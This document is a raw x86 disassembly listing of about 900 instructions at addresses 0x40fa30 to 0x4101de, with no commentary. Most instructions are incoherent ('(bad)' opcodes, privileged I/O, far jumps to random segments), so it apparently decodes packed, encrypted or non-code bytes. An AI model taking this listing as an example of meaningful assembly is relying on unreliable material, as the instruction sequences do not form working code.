  40fa30:	mov    cl,0x91
  40fa32:	ficom  DWORD PTR [edx-0x10750194]
  40fa38:	mul    BYTE PTR [eax]
  40fa3a:	mov    WORD PTR [eax+0x48],gs
  40fa3d:	popf   
  40fa3e:	mov    dh,0x35
  40fa40:	xlat   BYTE PTR ds:[ebx]
  40fa41:	push   esp
  40fa42:	xor    esp,ebx
  40fa44:	ret    
  40fa45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa47:	jb     0x40f9eb
  40fa49:	bound  eax,QWORD PTR [eax+0x22]
  40fa4c:	fidivr DWORD PTR [edx+0xf]
  40fa4f:	sar    BYTE PTR [ecx-0x47],cl
  40fa52:	cmp    al,0x48
  40fa54:	in     eax,0x4b
  40fa56:	and    edi,0x5dc1e50b
  40fa5c:	inc    ebp
  40fa5d:	fist   WORD PTR [edx+0x17cd9ec8]
  40fa63:	inc    esp
  40fa64:	aam    0xd5
  40fa66:	pop    DWORD PTR [eax+edx*2+0xd]
  40fa6a:	das    
  40fa6b:	cwde   
  40fa6c:	loope  0x40fae0
  40fa6e:	test   DWORD PTR [eax-0x75015936],esp
  40fa74:	test   al,0xf3
  40fa76:	(bad)  
  40fa77:	ror    BYTE PTR [ebx],1
  40fa79:	sahf   
  40fa7a:	icebp  
  40fa7b:	mov    edx,0xa1d24729
  40fa80:	jmp    0x5956:0xb5330a0c
  40fa87:	icebp  
  40fa88:	mov    ch,BYTE PTR [esi+0x1deb443c]
  40fa8e:	retf   0x127a
  40fa91:	jle    0x40fa1c
  40fa93:	iret   
  40fa94:	scas   eax,DWORD PTR es:[edi]
  40fa95:	adc    BYTE PTR [esi-0x15b9370a],ch
  40fa9b:	jne    0x40fac6
  40fa9d:	push   esi
  40fa9e:	or     al,0xe9
  40faa0:	retf   0x1f6c
  40faa3:	inc    eax
  40faa4:	cs (bad) 
  40faa7:	mov    al,0xf2
  40faa9:	pushf  
  40faaa:	repnz sub DWORD PTR [edx-0x3a08f7e8],0x72
  40fab2:	xchg   esi,eax
  40fab3:	rcr    DWORD PTR [ecx+0x67],1
  40fab6:	mov    dl,0xaf
  40fab8:	cmc    
  40fab9:	popf   
  40faba:	rcr    BYTE PTR [ebx+eax*1-0x4765e5e8],1
  40fac1:	out    dx,eax
  40fac2:	fld    TBYTE PTR [ebp+0x3b]
  40fac5:	push   ebx
  40fac6:	inc    eax
  40fac7:	ins    DWORD PTR es:[edi],dx
  40fac8:	ins    DWORD PTR es:[edi],dx
  40fac9:	mov    al,0x14
  40facb:	fadd   st,st(2)
  40facd:	dec    esp
  40face:	pop    esi
  40facf:	out    dx,al
  40fad0:	or     eax,0xde64dd0a
  40fad5:	mov    ecx,0x2ef6e16
  40fada:	mov    ?,WORD PTR [esi+0x11e60a42]
  40fae0:	lds    ecx,FWORD PTR [eax-0x4a87116]
  40fae6:	mov    ecx,0xe72c2559
  40faeb:	icebp  
  40faec:	fwait
  40faed:	pop    esi
  40faee:	lods   eax,DWORD PTR ds:[esi]
  40faef:	dec    esp
  40faf0:	cdq    
  40faf1:	jmp    0x9b1f7385
  40faf6:	lods   al,BYTE PTR gs:[esi]
  40faf8:	call   0x6468bf58
  40fafd:	dec    edi
  40fafe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faff:	out    dx,al
  40fb00:	int    0x98
  40fb02:	inc    edx
  40fb03:	xchg   ebx,eax
  40fb04:	pop    ss
  40fb05:	sbb    DWORD PTR [esi],edi
  40fb07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb08:	(bad)  
  40fb09:	stc    
  40fb0a:	addr16 mov eax,0x28edd780
  40fb10:	enter  0x979c,0xb6
  40fb14:	fsubr  DWORD PTR [edx+0x5ac204a8]
  40fb1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1b:	dec    edi
  40fb1c:	dec    edx
  40fb1d:	jmp    0xc398:0xf5142391
  40fb24:	mov    edi,DWORD PTR [eax+ebp*1]
  40fb27:	icebp  
  40fb28:	daa    
  40fb29:	inc    esi
  40fb2a:	mov    bh,0x39
  40fb2c:	xchg   ecx,eax
  40fb2d:	and    edi,0x4d1745f3
  40fb33:	and    al,0xbb
  40fb35:	xchg   edx,eax
  40fb36:	out    dx,al
  40fb37:	ja     0x40faf9
  40fb39:	test   eax,0x4ffbb2da
  40fb3e:	pop    ebp
  40fb3f:	cmp    ah,BYTE PTR [eax+ebp*8+0x3f45a873]
  40fb46:	aaa    
  40fb47:	inc    ecx
  40fb48:	(bad)  
  40fb49:	int    0x21
  40fb4b:	imul   ebx,DWORD PTR [ecx],0x89755ca9
  40fb51:	fwait
  40fb52:	jle    0x40fb80
  40fb54:	cli    
  40fb55:	pop    esi
  40fb56:	les    esp,FWORD PTR [eax+0x6bfb5609]
  40fb5c:	hlt    
  40fb5d:	in     al,dx
  40fb5e:	push   ebp
  40fb5f:	bound  ebp,QWORD PTR [ebp-0x55]
  40fb62:	sti    
  40fb63:	sar    ah,1
  40fb65:	inc    esp
  40fb66:	pop    ss
  40fb67:	pop    eax
  40fb68:	dec    eax
  40fb69:	imul   BYTE PTR [edx+ebx*2-0x76]
  40fb6d:	in     al,dx
  40fb6e:	cmc    
  40fb6f:	cwde   
  40fb70:	int    0x5e
  40fb72:	xor    DWORD PTR [esi+0x5cac4ecf],esi
  40fb78:	sbb    DWORD PTR [ecx+0x9],esi
  40fb7b:	jl     0x40fb16
  40fb7d:	call   0x403f:0x40431cdc
  40fb84:	ins    BYTE PTR es:[edi],dx
  40fb85:	(bad)  
  40fb86:	pop    ss
  40fb87:	nop
  40fb88:	mov    dh,0xdc
  40fb8a:	pushf  
  40fb8b:	pop    es
  40fb8c:	hlt    
  40fb8d:	repz and al,BYTE PTR [esi+0x3b]
  40fb91:	adc    BYTE PTR [ebp+ebp*2+0x67],bh
  40fb95:	mov    al,dh
  40fb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb98:	popf   
  40fb99:	push   ebx
  40fb9a:	sti    
  40fb9b:	adc    ebx,esp
  40fb9d:	loopne 0x40fba8
  40fb9f:	iret   
  40fba0:	retf   0xf92
  40fba3:	xchg   BYTE PTR [ecx-0x7],bh
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x7f
  40fbc9:	outs   dx,DWORD PTR ds:[esi]
  40fbca:	ds shl BYTE PTR fs:[esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	mov    edi,0x61a0989
  40fbd9:	mov    dh,0x90
  40fbdb:	stos   DWORD PTR es:[edi],eax
  40fbdc:	cmp    edx,DWORD PTR ds:0x19daa460
  40fbe2:	inc    esp
  40fbe3:	mov    esp,0x4e34bfb1
  40fbe8:	retf   
  40fbe9:	jno    0x40fc04
  40fbeb:	sahf   
  40fbec:	sbb    al,0xe9
  40fbee:	retf   0x817b
  40fbf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbf2:	dec    esi
  40fbf3:	sub    eax,0x157b4373
  40fbf8:	pop    edx
  40fbf9:	mov    ds:0xce63ec14,al
  40fbfe:	dec    esp
  40fbff:	xor    DWORD PTR [ecx],ebp
  40fc01:	aaa    
  40fc02:	leave  
  40fc03:	add    ebp,DWORD PTR [ecx+0x70c6296b]
  40fc09:	mov    edi,0x14071a81
  40fc0e:	stos   BYTE PTR es:[edi],al
  40fc0f:	inc    edx
  40fc10:	into   
  40fc11:	cmc    
  40fc12:	scas   eax,DWORD PTR es:[edi]
  40fc13:	mov    esp,DWORD PTR [ebx+esi*4-0x19]
  40fc17:	cmp    dl,BYTE PTR [edx+0x658c4cab]
  40fc1d:	and    al,0x12
  40fc1f:	xchg   ebp,eax
  40fc20:	mov    bh,0x99
  40fc22:	mov    BYTE PTR [edx-0x27ab3e3],0xfc
  40fc29:	xchg   ebx,eax
  40fc2a:	add    al,0x23
  40fc2c:	xchg   ebx,eax
  40fc2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc2e:	mov    al,ds:0x2f16bd5
  40fc33:	push   eax
  40fc34:	shr    DWORD PTR [ecx-0x76],cl
  40fc37:	cld    
  40fc38:	mov    eax,ds:0xa98d0b0d
  40fc3d:	or     eax,0x8a49db49
  40fc42:	test   eax,0x9b51812b
  40fc47:	out    0xd6,al
  40fc49:	jb     0x40fc0e
  40fc4b:	mov    DWORD PTR [ebp+0x6ce36cb8],ebx
  40fc51:	mov    ah,0xc5
  40fc53:	icebp  
  40fc54:	(bad)  
  40fc56:	scas   eax,DWORD PTR es:[edi]
  40fc57:	dec    ebx
  40fc58:	xor    eax,0xfc3fc947
  40fc5d:	shl    ch,1
  40fc5f:	and    edi,DWORD PTR [ebx+0x59]
  40fc62:	in     al,dx
  40fc63:	lock repnz mov fs,edx
  40fc67:	scas   eax,DWORD PTR es:[edi]
  40fc68:	xor    cl,BYTE PTR [ebp+ecx*1-0x45c23de]
  40fc6f:	clc    
  40fc70:	adc    ebx,ebp
  40fc72:	push   edi
  40fc73:	arpl   WORD PTR [eax-0x57],si
  40fc76:	sahf   
  40fc77:	int    0x68
  40fc79:	add    DWORD PTR [edx],ebp
  40fc7b:	jnp    0x40fcd3
  40fc7d:	dec    esp
  40fc7e:	aas    
  40fc7f:	test   eax,0x83f01241
  40fc84:	sub    eax,0x58d97ee4
  40fc89:	pop    eax
  40fc8a:	in     al,dx
  40fc8b:	sbb    bh,BYTE PTR [edi-0x23bc8d5e]
  40fc91:	mov    edi,0x7e8a501d
  40fc96:	pushf  
  40fc97:	jae    0x40fc45
  40fc99:	loopne 0x40fca4
  40fc9b:	inc    eax
  40fc9c:	dec    ebp
  40fc9d:	(bad)  
  40fc9e:	call   FWORD PTR [edi-0x1b3c8361]
  40fca4:	mov    ebx,0x54eb7e54
  40fca9:	aaa    
  40fcaa:	loopne 0x40fcc4
  40fcac:	std    
  40fcad:	es gs jg 0x40fc6c
  40fcb1:	mov    DWORD PTR [ecx],0x78d3e132
  40fcb7:	ret    
  40fcb8:	and    al,0xd7
  40fcba:	mov    ds:0xbf35b9e,eax
  40fcbf:	mov    ecx,0x15a4b743
  40fcc4:	push   ss
  40fcc5:	test   BYTE PTR [edi+esi*8-0x15ba9b6f],dh
  40fccc:	push   0x443013d7
  40fcd1:	jns    0x40fd18
  40fcd3:	mov    ch,0x3e
  40fcd5:	jecxz  0x40fc87
  40fcd7:	jp     0x40fcff
  40fcd9:	xchg   DWORD PTR [esi-0x75],esi
  40fcdc:	xor    eax,DWORD PTR [esi]
  40fcde:	pop    ecx
  40fcdf:	sbb    dh,BYTE PTR ds:0x612d432e
  40fce5:	adc    eax,0x67b2b950
  40fcea:	sbb    dh,cl
  40fcec:	cmp    eax,0xe6c296b8
  40fcf1:	neg    BYTE PTR [edx]
  40fcf3:	fmul   st(5),st
  40fcf5:	lods   al,BYTE PTR ds:[esi]
  40fcf6:	jae    0x40fcf1
  40fcf8:	into   
  40fcf9:	jp     0x40fd30
  40fcfb:	sub    al,0x9
  40fcfd:	push   edi
  40fcfe:	lea    ebx,[ebx+ebx*1-0x65f56c24]
  40fd05:	mov    dl,0xf8
  40fd07:	cmp    DWORD PTR [ebx],ecx
  40fd09:	hlt    
  40fd0a:	nop
  40fd0b:	xchg   esp,eax
  40fd0c:	jecxz  0x40fd62
  40fd0e:	and    DWORD PTR [esi-0x73917e06],esi
  40fd14:	jb     0x40fd80
  40fd16:	and    ah,bh
  40fd18:	adc    esi,DWORD PTR [ebp-0x75]
  40fd1b:	(bad)  
  40fd1c:	push   0xe8e46671
  40fd21:	adc    eax,0x74a2123a
  40fd26:	mov    ah,0xab
  40fd28:	(bad)  
  40fd29:	movq   mm2,mm2
  40fd2c:	neg    BYTE PTR [edi+0x4d]
  40fd2f:	dec    eax
  40fd30:	jne    0x40fce3
  40fd32:	imul   edx,DWORD PTR [ecx],0x5e
  40fd35:	inc    edx
  40fd36:	or     ebp,DWORD PTR [esi+0x23]
  40fd39:	adc    bh,BYTE PTR [edx+0x19]
  40fd3c:	ror    DWORD PTR [ebp-0x6ac22219],1
  40fd42:	mov    esi,0xbb888b05
  40fd47:	icebp  
  40fd48:	xchg   ebp,eax
  40fd49:	sub    ah,BYTE PTR [ebp+0x48]
  40fd4c:	inc    eax
  40fd4d:	test   al,0xd9
  40fd4f:	ja     0x40fd70
  40fd51:	sbb    al,dh
  40fd53:	inc    edx
  40fd54:	in     eax,dx
  40fd55:	loope  0x40fcf2
  40fd57:	mov    ecx,0x288a17b3
  40fd5c:	mov    eax,ds:0x4a1a346c
  40fd61:	add    edx,ebx
  40fd63:	pop    esp
  40fd64:	mov    DWORD PTR [ecx+esi*1+0x4db5208a],eax
  40fd6b:	xor    al,BYTE PTR [edx+0x4d67e8c9]
  40fd71:	(bad)  
  40fd72:	cmp    DWORD PTR [ebx-0x5a],esp
  40fd75:	xor    al,0x72
  40fd77:	ins    DWORD PTR es:[edi],dx
  40fd78:	outs   dx,BYTE PTR ds:[esi]
  40fd79:	call   0x15a17f98
  40fd7e:	jne    0x40fd32
  40fd80:	xor    BYTE PTR [eax-0x6e],bh
  40fd83:	pop    esi
  40fd84:	push   ebx
  40fd85:	sub    eax,0x41f25401
  40fd8a:	push   ds
  40fd8b:	mov    dh,BYTE PTR [ebx+0x7c6c5b7e]
  40fd91:	call   0xf2e2048f
  40fd96:	add    bh,BYTE PTR [ebx+eax*8-0x1fb54d2b]
  40fd9d:	or     BYTE PTR [ecx+esi*2+0x2c],0x74
  40fda2:	nop
  40fda3:	scas   eax,DWORD PTR es:[edi]
  40fda4:	pop    ebx
  40fda5:	inc    ebp
  40fda6:	mov    si,0xa27f
  40fdaa:	addr16 rcl bh,0x2a
  40fdae:	mov    al,0xb4
  40fdb0:	lds    edi,FWORD PTR [ebp-0x10f62368]
  40fdb6:	aad    0xc1
  40fdb8:	std    
  40fdb9:	cdq    
  40fdba:	aaa    
  40fdbb:	inc    esi
  40fdbc:	push   ss
  40fdbd:	add    DWORD PTR [edi-0x4e],esp
  40fdc0:	fabs   
  40fdc2:	push   0xd4922f65
  40fdc7:	je     0x40fd8f
  40fdc9:	fwait
  40fdca:	jns    0x40fd9e
  40fdcc:	jmp    0x40fd93
  40fdce:	ja     0x40fe14
  40fdd0:	(bad)  
  40fdd1:	and    eax,DWORD PTR [esi+0x45]
  40fdd4:	push   ds
  40fdd5:	(bad)  
  40fdd6:	sbb    bh,BYTE PTR [esi-0x49]
  40fdd9:	sub    edx,esi
  40fddb:	(bad)  
  40fddc:	and    DWORD PTR [ebp+0x7ecd64ef],edi
  40fde2:	out    dx,eax
  40fde3:	mov    DWORD PTR ds:0x4c8166ad,ecx
  40fde9:	iret   
  40fdea:	adc    eax,0x572c1e5c
  40fdef:	in     eax,0x10
  40fdf1:	push   ds
  40fdf2:	iret   
  40fdf3:	daa    
  40fdf4:	mov    esi,0x9784c500
  40fdf9:	jo     0x40fdcf
  40fdfb:	push   ss
  40fdfc:	aas    
  40fdfd:	and    bl,BYTE PTR [esi-0x6bac1076]
  40fe03:	sbb    ecx,edi
  40fe05:	mov    eax,0xca6fa74e
  40fe0a:	outs   dx,DWORD PTR ds:[esi]
  40fe0b:	fld    st(3)
  40fe0d:	mov    ah,0x62
  40fe0f:	mov    ds:0xc54bd72e,eax
  40fe14:	jb     0x40fe90
  40fe16:	(bad)  
  40fe17:	cld    
  40fe18:	inc    esp
  40fe19:	dec    ebx
  40fe1a:	add    eax,0xfe7426bc
  40fe1f:	arpl   WORD PTR [ebp-0x4c],ax
  40fe22:	retf   0x520f
  40fe25:	xchg   edi,eax
  40fe26:	push   edi
  40fe27:	push   es
  40fe28:	add    eax,0x216a5656
  40fe2d:	pop    ecx
  40fe2e:	and    al,BYTE PTR [ebx+eax*2+0x6f5c6a01]
  40fe35:	mov    al,ds:0xb1e20785
  40fe3a:	adc    ebp,edx
  40fe3c:	xor    DWORD PTR [ecx],edi
  40fe3e:	sbb    edi,edx
  40fe40:	inc    ecx
  40fe41:	popa   
  40fe42:	leave  
  40fe43:	sub    ebp,ebx
  40fe45:	push   es
  40fe46:	lock inc eax
  40fe48:	leave  
  40fe49:	inc    esi
  40fe4a:	dec    eax
  40fe4b:	jno    0x40fe30
  40fe4d:	and    ebp,edx
  40fe4f:	rcl    DWORD PTR [edx+0x758cd33d],cl
  40fe55:	sub    eax,0xd4de21d8
  40fe5a:	fild   WORD PTR [eax]
  40fe5c:	cld    
  40fe5d:	data16 cli 
  40fe5f:	push   esp
  40fe60:	imul   esi,esi,0x258d4209
  40fe66:	mov    ebx,0x1708c69d
  40fe6b:	sbb    BYTE PTR [ecx+0x7bbfa03b],dl
  40fe71:	jns    0x40fe55
  40fe73:	and    edi,DWORD PTR [ecx]
  40fe75:	jmp    0xea15:0x87a83fb7
  40fe7c:	jbe    0x40fe8b
  40fe7e:	icebp  
  40fe7f:	pop    esp
  40fe80:	(bad)  
  40fe81:	popa   
  40fe82:	in     al,0x94
  40fe84:	fwait
  40fe85:	jle    0x40fe35
  40fe87:	loop   0x40fe13
  40fe89:	mov    bh,BYTE PTR [ebx-0x38]
  40fe8c:	icebp  
  40fe8d:	mov    ecx,DWORD PTR [edx+0x18]
  40fe90:	out    dx,al
  40fe91:	repnz xor BYTE PTR [edx-0x56c3ea1d],dh
  40fe98:	mov    dh,0x6e
  40fe9a:	into   
  40fe9b:	mov    bl,0x29
  40fe9d:	cli    
  40fe9e:	and    al,0xe4
  40fea0:	push   ecx
  40fea1:	and    cl,ch
  40fea3:	sub    BYTE PTR [eax-0x4278e998],ch
  40fea9:	pop    ss
  40feaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feab:	and    eax,0xa659d5a8
  40feb0:	daa    
  40feb1:	or     DWORD PTR [esp+edi*8+0x55],0xffffffda
  40feb6:	jo     0x40ff1c
  40feb8:	nop
  40feb9:	xor    DWORD PTR ds:0xb4bfa9b7,0xffffff9e
  40fec0:	pop    esp
  40fec1:	popf   
  40fec2:	aam    0x50
  40fec4:	push   0x1bbac4
  40fec9:	pop    ds
  40feca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fecb:	push   0x36
  40fecd:	sbb    ebp,DWORD PTR ss:[ecx]
  40fed0:	push   ecx
  40fed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed2:	ret    
  40fed3:	cld    
  40fed4:	cmc    
  40fed5:	cwde   
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xf7b44346
  40fef3:	stos   BYTE PTR es:[edi],al
  40fef4:	jb     0x40fed4
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40fea2
  40fefe:	js     0x40febe
  40ff00:	lods   al,BYTE PTR ds:[esi]
  40ff01:	or     DWORD PTR [eax],ebp
  40ff03:	(bad)  
  40ff04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff05:	inc    esi
  40ff06:	mov    ch,BYTE PTR [esi-0x4729a885]
  40ff0c:	cmp    edx,DWORD PTR [ecx]
  40ff0e:	jmp    0x40feab
  40ff10:	aad    0x8d
  40ff12:	in     eax,dx
  40ff13:	mov    esp,DWORD PTR [esi+0x15]
  40ff16:	inc    esp
  40ff17:	jmp    0x381f:0xbfdef9e2
  40ff1e:	pop    esp
  40ff1f:	jg     0x40fef2
  40ff21:	gs popf 
  40ff23:	cs dec esi
  40ff25:	hlt    
  40ff26:	lea    ecx,[ecx-0x9]
  40ff29:	mov    BYTE PTR [eax],ch
  40ff2b:	sub    al,BYTE PTR [edi+ebp*8+0x1c]
  40ff2f:	push   ds
  40ff30:	jb     0x40ff38
  40ff32:	mov    ah,0xe
  40ff34:	pusha  
  40ff35:	call   0x35a9:0x8a4a0477
  40ff3c:	jecxz  0x40fee4
  40ff3e:	push   ss
  40ff3f:	out    0x1a,eax
  40ff41:	push   0x8645439a
  40ff46:	fadd   DWORD PTR [eax+0x1138fd76]
  40ff4c:	mov    ss,WORD PTR [edi]
  40ff4e:	or     dl,BYTE PTR [edx]
  40ff50:	cld    
  40ff51:	(bad)  
  40ff52:	dec    esi
  40ff53:	push   esp
  40ff54:	pusha  
  40ff55:	lods   eax,DWORD PTR ds:[esi]
  40ff56:	enter  0xa8de,0x40
  40ff5a:	add    al,0xa3
  40ff5c:	out    dx,al
  40ff5d:	aam    0x84
  40ff5f:	xor    ch,BYTE PTR [ecx+eiz*1]
  40ff62:	test   al,0x6a
  40ff64:	mov    ch,0x72
  40ff66:	retf   0xb366
  40ff69:	sbb    DWORD PTR [ebx-0x17],0xffffffde
  40ff6d:	cmp    DWORD PTR [ecx-0x6148575f],ebp
  40ff73:	or     esp,DWORD PTR [edi]
  40ff75:	lea    ebp,[edi]
  40ff77:	aaa    
  40ff78:	enter  0xdb00,0x3d
  40ff7c:	jg     0x40fff6
  40ff7e:	test   BYTE PTR [esi+ebp*8],0x9e
  40ff82:	and    BYTE PTR [esi+0x604bd7b8],dh
  40ff88:	xlat   BYTE PTR ds:[ebx]
  40ff89:	mov    dh,0x67
  40ff8b:	fiadd  DWORD PTR [eax-0x42]
  40ff8e:	sbb    al,0x11
  40ff90:	or     DWORD PTR [edx+eax*4-0x53],ecx
  40ff94:	mov    edi,0x1851a1ce
  40ff99:	call   0xbc52:0xf87eae
  40ffa0:	dec    edx
  40ffa1:	aas    
  40ffa2:	add    esp,DWORD PTR [edx]
  40ffa4:	ss and cl,cl
  40ffa7:	rol    BYTE PTR [esi+0x26],cl
  40ffaa:	test   DWORD PTR [eax-0xfb90baa],esp
  40ffb0:	inc    ecx
  40ffb1:	mov    ds:0x61e9b1c9,eax
  40ffb6:	sub    BYTE PTR [edx+0x12],0x60
  40ffba:	jge    0x40ffff
  40ffbc:	test   eax,0x284b9e88
  40ffc1:	xor    eax,0x9454475f
  40ffc6:	push   0xb8247d40
  40ffcb:	push   cs
  40ffcc:	jmp    0xb626376e
  40ffd1:	xchg   ecx,eax
  40ffd2:	es push 0x2b
  40ffd5:	in     al,0x36
  40ffd7:	(bad)  
  40ffd8:	jg     0x41002a
  40ffda:	test   eax,0x8b58f3e0
  40ffdf:	pushf  
  40ffe0:	cmp    edx,DWORD PTR [eax-0x18a83d60]
  40ffe6:	mov    ds:0x10987054,al
  40ffeb:	aam    0x19
  40ffed:	leave  
  40ffee:	hlt    
  40ffef:	popf   
  40fff0:	mov    bl,0xee
  40fff2:	test   eax,0xcafa103a
  40fff7:	es dec edi
  40fff9:	add    al,0xfd
  40fffb:	stos   DWORD PTR es:[edi],eax
  40fffc:	jg     0x40ff8c
  40fffe:	aaa    
  40ffff:	jne    0x40fffc
  410001:	inc    esi
  410002:	mov    esp,DWORD PTR [ebx-0x79be2bf6]
  410008:	leave  
  410009:	mov    BYTE PTR [edi+0x207b7b43],cl
  41000f:	sti    
  410010:	mov    ecx,0x81e1b027
  410015:	aaa    
  410016:	loopne 0x40ffed
  410018:	sar    DWORD PTR [eax+0x10ca2ae7],cl
  41001e:	dec    eax
  41001f:	or     ch,bh
  410021:	mov    esp,esp
  410023:	idiv   BYTE PTR [ebx+0x13]
  410026:	push   ss
  410027:	pop    edx
  410028:	inc    edx
  410029:	jmp    0x75be:0x76fedd97
  410030:	sbb    DWORD PTR [ebx+0x3b],0xfffffffb
  410034:	shr    BYTE PTR [eax-0x63],0x83
  410038:	or     al,cl
  41003a:	call   0x794d:0x51430536
  410041:	sub    eax,0xbc53f995
  410046:	fwait
  410047:	test   al,0x19
  410049:	or     eax,0x8984076a
  41004f:	cmp    BYTE PTR [ecx+0x2],cl
  410052:	dec    ebp
  410053:	and    cl,BYTE PTR [esi-0x52e4446a]
  410059:	lds    ecx,FWORD PTR [eax+0x2409bea6]
  41005f:	xchg   ebx,eax
  410060:	ja     0x410002
  410062:	and    al,0x73
  410064:	mov    DWORD PTR [edx+ebx*2+0x63],edi
  410068:	stos   BYTE PTR es:[edi],al
  410069:	fcom   QWORD PTR [ecx+0x3f]
  41006c:	xor    ebx,edi
  41006e:	int    0x93
  410070:	(bad)  
  410071:	out    0x78,al
  410073:	ss push esi
  410075:	fbstp  TBYTE PTR [esi-0x38]
  410078:	std    
  410079:	test   ch,dh
  41007b:	gs jae 0x4100cf
  41007e:	push   0x69fe283
  410083:	cs loop 0x410039
  410086:	or     ebp,esp
  410088:	data16 (bad) 
  41008a:	xchg   ecx,eax
  41008b:	adc    DWORD PTR [edx],esp
  41008d:	(bad)  
  41008e:	xchg   ebx,eax
  41008f:	aaa    
  410090:	jl     0x410028
  410092:	and    al,0x74
  410094:	fcomp  QWORD PTR ds:0x6393923b
  41009a:	loop   0x410039
  41009c:	xchg   edi,eax
  41009d:	or     eax,0x65606fa6
  4100a2:	and    dl,al
  4100a4:	push   ds
  4100a5:	ss mov bh,0x26
  4100a8:	and    al,0x59
  4100aa:	popf   
  4100ab:	jmp    0x633425e1
  4100b0:	cwde   
  4100b1:	sbb    edx,DWORD PTR [eax+0x20a2f3fb]
  4100b7:	popf   
  4100b8:	cmp    dh,cl
  4100ba:	das    
  4100bb:	out    0xf3,eax
  4100bd:	dec    esp
  4100be:	mov    gs,WORD PTR ds:0xa26cc188
  4100c4:	pop    ss
  4100c5:	mov    ebx,0xfe1a4c4d
  4100ca:	jg     0x410118
  4100cc:	out    dx,eax
  4100cd:	in     eax,0xe1
  4100cf:	dec    edi
  4100d0:	cwde   
  4100d1:	cmp    ebp,edx
  4100d3:	dec    eax
  4100d4:	loope  0x4100f3
  4100d6:	sar    DWORD PTR [esi-0x25],1
  4100d9:	adc    DWORD PTR [ebp+edx*2+0x41279f26],0xf137a637
  4100e4:	push   ss
  4100e5:	push   edi
  4100e6:	xor    ecx,DWORD PTR [ebx+0x10]
  4100e9:	fild   QWORD PTR [ecx+0x20]
  4100ec:	add    ebp,DWORD PTR [ebp-0x2c]
  4100ef:	sbb    eax,0x430b1a2
  4100f4:	cdq    
  4100f5:	adc    al,BYTE PTR [ebx+0x7d]
  4100f8:	into   
  4100f9:	in     eax,0x13
  4100fb:	push   edi
  4100fc:	outs   dx,DWORD PTR ds:[esi]
  4100fd:	inc    ebp
  4100fe:	popa   
  4100ff:	push   ss
  410100:	or     eax,0xb8dcab87
  410105:	scas   al,BYTE PTR es:[edi]
  410106:	mov    esi,DWORD PTR [esi-0x32]
  410109:	mov    bh,BYTE PTR [eax-0x65]
  41010c:	or     edx,edx
  41010e:	call   0x8b8e065b
  410113:	mov    ebx,0xa8e799b
  410118:	rcr    DWORD PTR [ebp-0x68578147],0x93
  41011f:	cmp    eax,0x1505e06b
  410124:	cdq    
  410125:	or     al,0xb5
  410127:	lods   eax,DWORD PTR ds:[esi]
  410128:	imul   esi,DWORD PTR [ecx],0x7015430d
  41012e:	and    eax,0xefd75ba
  410133:	(bad)  
  410134:	bound  edi,QWORD PTR [ebx]
  410136:	test   BYTE PTR [ebp-0x4b],0x2e
  41013a:	push   ss
  41013b:	fs je  0x410179
  41013e:	dec    edi
  41013f:	data16 xchg BYTE PTR [esp+eax*4-0x18],ch
  410144:	mov    ch,BYTE PTR [ebp-0x15fdf78e]
  41014a:	cwde   
  41014b:	pop    ds
  41014c:	mov    esp,eax
  41014e:	aam    0x89
  410150:	call   0x417c:0xbbef8c6c
  410157:	jbe    0x4100f1
  410159:	xor    al,0xf0
  41015b:	jmp    0x2d64:0x4b7a44c3
  410162:	es sysret 
  410165:	dec    eax
  410166:	cmp    DWORD PTR [edi-0x3a],0x906d48f6
  41016d:	hlt    
  41016e:	not    DWORD PTR [edx-0xc2cf23f]
  410174:	pusha  
  410175:	sub    edx,DWORD PTR [esi+edx*2+0x6537e9b]
  41017c:	or     al,BYTE PTR [esi]
  41017e:	cmp    bh,BYTE PTR [edx+0x13031adb]
  410184:	mov    ebp,0x3760bc9a
  410189:	inc    ebx
  41018a:	fwait
  41018b:	pop    esp
  41018c:	loopne 0x41017b
  41018e:	outs   dx,BYTE PTR ds:[esi]
  41018f:	fsubr  QWORD PTR [edi-0x4bce3e9c]
  410195:	pop    esp
  410196:	sbb    DWORD PTR [eax+0x79],ebp
  410199:	fs jecxz 0x410132
  41019c:	je     0x410169
  41019e:	cmp    DWORD PTR [eax+esi*8+0x6daa0c24],edx
  4101a5:	fstp   TBYTE PTR [edi+0x76ae08f6]
  4101ab:	cvtps2pd xmm5,xmm3
  4101ae:	imul   ebx,esp,0x46aac0d4
  4101b4:	call   0xcb0f643a
  4101b9:	enter  0xd1fe,0x24
  4101bd:	cmp    ah,ah
  4101bf:	ins    DWORD PTR es:[edi],dx
  4101c0:	mov    ah,0x5f
  4101c2:	jae    0x410192
  4101c4:	push   ecx
  4101c5:	or     eax,0xa755babb
  4101ca:	fist   DWORD PTR [eax+0x7]
  4101cd:	push   ds
  4101ce:	cdq    
  4101cf:	or     eax,0x3257c49a
  4101d4:	jecxz  0x410189
  4101d6:	add    al,0xc7
  4101d8:	pusha  
  4101d9:	sub    eax,0x72f01010
  4101de:	out    0x8b,al
